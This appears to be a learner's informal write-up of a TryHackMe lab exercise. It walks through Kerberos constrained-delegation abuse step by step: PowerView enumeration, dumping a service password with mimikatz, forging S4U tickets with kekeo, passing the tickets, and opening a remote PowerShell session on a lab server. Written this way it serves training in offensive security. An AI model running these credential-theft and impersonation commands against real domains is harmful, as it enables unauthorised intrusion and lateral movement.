this is an example of how it can be done:

firstly, import the powersploit module thats needed to enumerate the system:
Import-Module C:\Tools\PowerView.ps1 

Then, execute enumeration:
Get-NetUser -TrustedToAuth

This finds all the users that are trusted to auth (wow).

You could perform some nice proper post exploitation using mimikatz.
(Inisde the Post-Expl module).

Then, use mimikatz to try and find some sort of service to exploit.
I managed to find this service called winIIC to exploit, which
gave me a plaintext password which was nice through mimikatz.

commands for mimikatz are within the post exploitation module.
theyre in the one which mentions about ensuring to exit if doing
kereberos ticket stuff.

now, here is where we need to use kekeo to generate ourselves a 
kereberos authentication ticket.

first, run kekeo.exe
then, the syntax:
tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:redacted 

This then grants us the TGT for the account that can perform delegation, 
so we can forge requests for the account we want to impersonate.

This is the command:
tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc

then for the wsman service:
tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:WSMAN/THMSERVER1.za.tryhackme.loc

The rundown:
tgt - our ticket granting ticket 
user - we need someone whos on the next tier of the network.
we then need to perform this on both HTTP and WSMAN to allow us to create
a PSSession on THMSERVER1.

Then, back to mimikatz to get the privileges debugged. You may exit the
kekeo program.

run mimikatz
then privilege::debug 
now, import tickets:
kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi


Then, exit mimikatz,  once theyre imported, you can run "klist" to ensure that they
have been imported.

If mimikatz worked, with the files, itll say "file then the file" and then
life is generally better.

Now, time to enter a new powershell session within the server we have
tried to hard to breach.

Commands are as follows:
New-PSSession -ComputerName thmserver1.za.tryhackme.loc

Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc

Then a cheeky whoami gives us the nice little server breach.

